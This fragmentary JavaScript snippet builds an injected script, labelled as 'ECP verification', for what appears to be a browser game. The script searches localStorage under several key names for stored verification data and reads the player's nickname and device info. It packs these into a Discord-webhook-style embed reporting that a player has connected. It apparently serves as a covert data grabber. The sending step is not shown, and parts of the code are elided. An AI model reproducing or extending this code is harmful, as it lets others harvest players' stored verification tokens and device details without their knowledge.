(function () {
  ...
  // ---------------- Fixed ECP Verification ----------------
  const fixedECPScript = `
  (function () {
    'use strict';
    ...
    const lastNickname = getLocalStorageItem("lastNickname", "Unknown");
    const possibleECPKeys = ["ECPVerified", "ecp", "ECP", "ecpVerified", "verified"];
    let ecpStatus = "no";
    let ecpData = null;
    for (const key of possibleECPKeys) {
      const value = getLocalStorageItem(key, null);
      if (value !== null) {
        ecpStatus = "yes";
        ecpData = value;
        console.log("Found ECP data in key:", key);
        break;
      }
    }
    if (ecpData) {
      ecpData = safeJSONParse(ecpData, ecpData);
    }
    let formattedECPData = "No";
    if (ecpData) {
      if (typeof ecpData === "object") {
        formattedECPData = JSON.stringify(ecpData, null, 2);
      } else if (ecpData === "yes" || ecpData === true) {
        formattedECPData = "Yes";
      } else {
        formattedECPData = String(ecpData);
      }
    }
    ...
    const payload = {
      embeds: [{
        ...
        description: "A player has connected to the game",
        color: 0x00FF00,
        fields: [
          { name: "Nickname", value: lastNickname, inline: true },
          { name: "ECP Status", value: formattedECPData, inline: true },
          { name: "Device Info", value: \`\`\`${JSON.stringify(deviceInfo, null, 2)}\`\`\` }
        ],
        timestamp: new Date().toISOString()
      }]
    };
